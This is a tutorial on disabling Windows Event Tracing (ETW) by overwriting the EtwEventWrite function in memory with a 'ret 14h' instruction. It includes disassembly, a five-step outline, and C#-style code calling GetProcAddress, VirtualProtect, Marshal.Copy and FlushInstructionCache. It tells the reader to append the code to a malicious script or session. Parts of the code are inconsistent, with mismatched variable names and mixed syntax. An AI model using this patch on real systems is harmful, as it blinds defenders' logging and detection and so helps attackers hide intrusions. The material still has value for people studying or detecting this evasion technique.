# Patching tracing functions

ETW is loaded from the runtime of every new process, commonly originating from the CLR (Common Language Runtime). 
Within a new process, ETW events are sent from userland and issued directly from the current process. An attacker 
can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality.

ETW is written from the function `EtwEventWrite`. The disassembly of that function:

```text
779f2459 33cc          xor    ecx, esp
779f245b e8501a0100    call   ntdll!_security_check_cookie
779f2460 8be5          mov    esp, ebp
779f2462 5d            pop    ebp
779f2463 c21400        ret    14h 
```

`ret 14h` will end the function and returns control to the calling application.

At a high level, ETW patching can be broken up into five steps:

* Obtain a handle for EtwEventWrite
* Modify memory permissions of the function
* Write opcode bytes to memory
* Reset memory permissions of the function (optional)
* Flush the instruction cache (optional)

## Code

`EtwEventWrite` is stored within `ntdll`. Load the library and obtain the handle using `GetProcAddress`:

```text
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

The permission of the function is defined by the `flNewProtect` parameter; `0x40` enables `X`, `R`, or `RW` access:

```text
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```

Now the function has the permissions required to write to it, and the pre-defined opcode to patch it is known. Because 
of writing to a function and not a process, `Marshal.Copy` can be used to write the opcode.

```text
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```

Clean to restore memory permissions as they were:

    VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);

Make sure the patched function will be executed from the instruction cache:

```text
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

Compile these steps together and append them to a malicious script or session. 

After the opcode is written to memory, view the disassembled function again:

```text
779f23c0 c21400         ret    14h
779f23c3 00ec           add    ah, ch
779f23c5 83e4f8         and    esp, 0FFFFFFF8h
779f23c8 81ece0000000   sub    esp, 0E0h
```

Once the function is patched in memory, it will always return when `EtwEventWrite` is called. And that means it might 
not be a good idea as it may restrict more logs than desired for integrity.

